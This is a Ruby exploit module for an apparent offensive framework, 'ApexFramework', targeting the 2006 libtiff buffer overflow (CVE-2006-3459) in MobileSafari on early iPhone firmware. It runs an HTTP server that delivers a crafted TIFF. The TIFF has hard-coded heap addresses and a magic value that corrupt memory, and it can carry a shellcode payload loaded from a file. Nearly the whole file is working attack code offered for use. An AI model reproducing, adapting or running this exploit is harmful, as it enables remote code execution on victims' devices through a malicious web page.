# frozen_string_literal: true

require 'webrick'
require 'securerandom'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class SafariLibtiff < ApexModule

      info(
        name:            'Apple iOS MobileSafari LibTIFF Buffer Overflow',
        category:        'browser',
        rank:            'good',
        description:     'Exploits a buffer overflow in libtiff shipped with firmware versions 1.00, 1.01, 1.02, and 1.1.1 of the Apple iPhone via MobileSafari.',
        authors:         ['hdm', 'kf'],
        references:      [
          { type: 'CVE',   id: '2006-3459' },
          { type: 'OSVDB', id: '27723' },
          { type: 'BID',   id: '19283' }
        ],
        disclosure_date: '2006-08-01',
        platform:        'osx',
        arch:            'armle'
      )

      register_option :SRVHOST,     type: :string,  required: true,  default: '127.0.0.1', description: 'Listen address for HTTP server'
      register_option :SRVPORT,     type: :port,    required: true,  default: 8080,       description: 'Listen port for HTTP server'
      register_option :URIPATH,     type: :string,  required: false, default: '/',        description: 'URI path to serve the exploit'
      register_option :PAYLOAD_FILE,type: :string,  required: false, default: '',         description: 'Path to raw payload binary (optional)'

      TARGET = {
        name:  'MobileSafari iPhone Mac OS X (1.00, 1.01, 1.02, 1.1.1)',
        heap:  0x00802000,
        magic: 0x300d562c
      }.freeze

      def run
        log_status "Starting HTTP server on #{get(:SRVHOST)}:#{get(:SRVPORT)}"
        log_status "Exploit URI: http://#{get(:SRVHOST)}:#{get(:SRVPORT)}#{get(:URIPATH)}"

        server = WEBrick::HTTPServer.new(
          BindAddress:  get(:SRVHOST),
          Port:         get(:SRVPORT),
          Logger:       WEBrick::Log.new('/dev/null'),
          AccessLog:    []
        )

        server.mount_proc(get(:URIPATH)) do |_req, res|
          log_status 'Client connected — sending exploit TIFF'
          tiff_data = generate_tiff
          res['Content-Type'] = 'image/tiff'
          res.body = tiff_data
          log_good "Exploit TIFF sent (#{tiff_data.bytesize} bytes)"
        end

        log_good 'HTTP server running. Waiting for target connection...'
        begin
          server.start
        rescue Interrupt
          log_status 'Shutting down HTTP server...'
        ensure
          server.shutdown
        end
      rescue StandardError => e
        log_error "HTTP server error: #{e.message}"
      end

      private

      def generate_tiff
        heap  = TARGET[:heap]
        magic = TARGET[:magic]
        lolz  = 2048

        tiff = +"\x49\x49\x2a\x00\x1e\x00\x00\x00\x00\x00\x00\x00"
        tiff << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        tiff << "\x00\x00\x00\x00\x00\x00\x08\x00\x00\x01\x03\x00"
        tiff << "\x01\x00\x00\x00\x08\x00\x00\x00\x01\x01\x03\x00"
        tiff << "\x01\x00\x00\x00\x08\x00\x00\x00\x03\x01\x03\x00"
        tiff << "\x01\x00\x00\x00\xaa\x00\x00\x00\x06\x01\x03\x00"
        tiff << "\x01\x00\x00\x00\xbb\x00\x00\x00\x11\x01\x04\x00"
        tiff << "\x01\x00\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00"
        tiff << "\x01\x00\x00\x00\x15\x00\x00\x00\x1c\x01\x03\x00"
        tiff << "\x01\x00\x00\x00\x01\x00\x00\x00\x50\x01\x03\x00"
        tiff << [lolz].pack('V')
        tiff << "\x84\x00\x00\x00\x00\x00\x00\x00"

        data = SecureRandom.random_bytes(lolz)
        data = +data

        data[120, 4] = [magic].pack('V')
        data[104, 4] = [heap - 0x30].pack('V')
        data[92, 4] = [data.length].pack('V')
        data[116, 4] = [heap + 44 + 0x14].pack('V')
        data[192, 4] = [heap + 196].pack('V')

        payload_bin = load_payload
        if payload_bin && !payload_bin.empty?
          data[196, payload_bin.length] = payload_bin
        end

        tiff << data
        tiff
      end

      def load_payload
        path = get(:PAYLOAD_FILE)
        return nil if path.nil? || path.empty?

        unless File.exist?(path)
          log_warning "Payload file not found: #{path}"
          return nil
        end

        payload = File.binread(path)
        log_status "Loaded payload: #{payload.bytesize} bytes from #{path}"
        payload
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'browser/safari_libtiff',
  ApexFramework::Modules::SafariLibtiff
)
